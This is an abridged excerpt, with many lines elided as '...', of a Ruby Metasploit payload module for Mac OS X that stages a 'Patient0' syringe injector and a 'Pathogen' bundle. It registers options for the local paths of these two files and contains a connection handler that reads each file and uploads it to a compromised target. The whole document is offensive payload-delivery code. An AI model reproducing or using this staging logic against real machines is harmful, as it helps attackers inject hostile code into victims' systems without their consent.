...
module Payload::Osx::Patient0
	...
	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Mac OS X Inject Patient0 + Pathogen',
			...
			'Author'        => 
				[
					...
					'Dino Dai Zovi <ddz@theta44.org>',  # derived from bundleinject.rb
				],
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_X86,
		...
		register_options(
			[
				OptPath.new('SYRINGE', [ true, "The local path of the patient0 injector to upload" ]),
				OptPath.new('PATHOGEN', [ true, "The local path of the patient0 pathogen to upload" ]),
			], self.class)
	end
	...
	def handle_connection_stage(conn)
		...
		begin
			File.open(datastore['SYRINGE'], "rb") { |f|
				data += f.read
			}
		rescue
			print_error("Failed to load syringe: #{$!}.")
		...
		print_status("Uploading syringe bundle (#{data.length} bytes)...")
		...
		print_status("Syringe upload completed.")

		data = ""
		begin
			File.open(datastore['PATHOGEN'], "rb") { |f|
				data += f.read
			}
		rescue
		...
		print_status("Uploading pathogen bundle (#{data.length} bytes)...")
